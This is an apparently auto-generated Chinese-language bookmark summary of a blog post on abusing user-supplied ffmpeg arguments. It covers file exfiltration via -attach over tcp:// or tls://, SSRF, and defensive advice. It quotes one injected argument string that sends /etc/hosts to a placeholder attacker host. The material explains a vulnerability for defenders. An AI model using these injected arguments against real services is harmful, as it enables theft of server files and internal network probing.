# Exfiltration via ffmpeg
- URL: https://beny23.github.io/posts/ffmpeg_exfil/
- Added At: 2025-11-24 14:32:00
- Tags: #read #security #hack
- [Link To Text](2025-11-24-exfiltration-via-ffmpeg_raw.md)

## TL;DR
允许用户自定义ffmpeg参数存在安全风险：攻击者可能利用-attach参数窃取本地文件或发起SSRF攻击，通过tcp/tls协议外泄数据。建议严格过滤参数并加强网络隔离防御。

## Summary
这篇文章探讨了当应用程序允许用户自定义ffmpeg参数时可能存在的安全风险。以下是主要要点：

**核心问题**：即使应用使用安全的调用方式（如Node.js的`spawn`函数），避免命令注入，但ffmpeg本身的功能可能被滥用，导致文件泄露或服务端请求伪造（SSRF）。

**攻击方法**：
1. **文件泄露**：
   - 利用ffmpeg的`-attach`参数在Matroska格式中嵌入附件流，将本地文件（如`/etc/hosts`）打包并通过网络（如`tcp://`或`tls://`协议）发送给攻击者控制的服务器。
   - 示例中演示了通过注入参数（如`-c copy -attach /etc/hosts -f matroska tcp://attacker:8008`）成功窃取文件内容。

2. **服务端请求伪造（SSRF）**：
   - 通过`-attach`参数指定URL（如`https://httpbin.io/dump/request`），ffmpeg会发起HTTP请求，从而暴露内部网络信息或绕过防火墙。
   - 攻击者可以获取请求头等敏感数据，用于侦察或进一步攻击。

3. **隐蔽渗透**：
   - 使用TLS协议（如`tls://`）加密传输数据，增加检测难度。

**防御建议**：
- 实施严格的出口（egress）保护，限制网络出站流量。
- 审查和过滤用户提供的ffmpeg参数，避免使用危险选项（如`-attach`或网络相关参数）。

**总结**：ffmpeg功能强大，但若参数控制不当，可能成为攻击工具。开发人员需加强输入验证和网络隔离，以降低风险。
